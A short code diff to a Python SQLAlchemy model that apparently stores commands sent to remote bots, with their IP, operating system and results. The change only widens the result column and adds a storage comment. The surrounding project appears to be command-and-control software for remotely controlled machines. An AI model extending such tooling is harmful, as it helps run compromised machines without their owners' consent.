@@ -84,7 +84,8 @@ class Command(db.Model):
     bot_ip = db.Column(db.String(128))
     timestamp = db.Column(db.DateTime) 
     latest = db.Column(db.Boolean, default=False)
-    result = db.Column(db.String(500))
+    # Postgresql is smart enough to NOT use all 50000 bytes for results that are smaller than that. So we are fine. 
+    result = db.Column(db.String(50000))
 
     def __init__(self, cmd, bot_id, bot_ip, bot_os):
         self.cmd = cmd 
